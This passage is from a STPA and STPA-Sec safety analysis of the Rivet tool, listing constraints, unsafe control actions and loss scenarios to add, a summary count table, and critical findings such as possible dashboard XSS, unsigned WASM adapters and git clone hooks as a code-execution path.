2. **Add to `system-constraints.yaml`:** SC-15, SC-16, SC-17, SC-18, SC-19
3. **Add to `control-structure.yaml`:** No new controllers needed yet (the requested CTRL-EXPORT, CTRL-YAML-EDIT, CTRL-SALSA do not exist in the codebase — export.rs, yaml_edit.rs, db.rs are not present on this branch. The analysis covers these concerns under existing controllers.)
4. **Add to `ucas.yaml`:**
   - Dashboard: UCA-D-3, UCA-D-4
   - Core: UCA-C-18 through UCA-C-25
   - CLI: UCA-L-6, UCA-L-7
5. **Add to `controller-constraints.yaml`:** CC-D-3/D-4, CC-C-18 through CC-C-25, CC-L-6/L-7
6. **Add to `loss-scenarios.yaml`:** LS-C-5 through LS-C-15, LS-D-3, LS-L-3

### Priority 2: STPA-Sec artifacts (new)

Create `safety/stpa/security-constraints.yaml` with:
- SEC-1: CSP header on dashboard
- SEC-2: WASM component hash verification
- SEC-3: Git clone hook disabling for externals
- SEC-4: rivet.lock integrity verification
- SEC-5: Artifact count validation for WASM adapter output
- SEC-6: Path anonymization in exports and dashboard

### Priority 3: OSLC gap remediation

- Add a hazard (H-18?) for "Rivet schema change weakens validation without artifact-level audit trail"
- Add a constraint (SC-20?) for "Rivet must record schema version and content hash alongside validation results"
- Add a hazard (H-19?) for "Different Rivet binary versions produce different validation results for the same inputs"
- Add a constraint (SC-21?) for "Rivet must embed its version and schema hashes in all generated reports for reproducibility verification"

---

## Summary of Findings

| Category | Count | Existing | New |
|----------|-------|----------|-----|
| Losses | 6 | 6 | 0 |
| Hazards | 17 (+2 sub) | 12 (+6 sub) | 5 (+2 sub) |
| System constraints | 19 | 14 | 5 |
| Controllers | 7 | 7 | 0 (requested ones don't exist on this branch) |
| UCAs | 47 | 32 | 15 |
| Controller constraints | 44 | 31 | 13 |
| Loss scenarios | 27 | 13 | 14 |
| STPA-Sec findings | 6 | 0 | 6 |
| OSLC gaps | 3 | 0 | 3 |

### Critical Findings

1. **XSS in dashboard** (H-13): The dashboard generates HTML via string formatting in serve.rs. While document.rs has html_escape(), the serve.rs routes may have inconsistent escaping. No CSP header is set. This is the highest-impact security finding because the dashboard is used during audit reviews.

2. **WASM supply chain** (H-14): WASM adapters are loaded as binary blobs without signature verification. The adapter output is trusted without independent verification. Fuel and memory limits provide DoS protection but not integrity protection.

3. **Missing loss scenarios** (UCA-C-10 through UCA-C-17): Eight UCAs related to incremental validation and MODULE.bazel parsing had no loss scenarios. These are now covered by LS-C-5 through LS-C-12.

4. **Commit traceability false positives** (H-15): The `is_artifact_id()` pattern matches standard identifiers like ISO-26262 and MISRA-C2012. STPA artifact IDs (H-1.2, UCA-C-10) are NOT matched. This systematically excludes safety-critical artifacts from commit coverage.

5. **Lifecycle check hardcoding** (UCA-C-24): The lifecycle completeness check only knows about the dev schema's type hierarchy. Cybersecurity, STPA, and ASPICE schemas are invisible to it.

6. **Git clone as code execution vector** (H-17): `rivet sync` clones arbitrary git URLs from rivet.yaml without disabling hooks, creating a path from configuration tampering to arbitrary code execution.
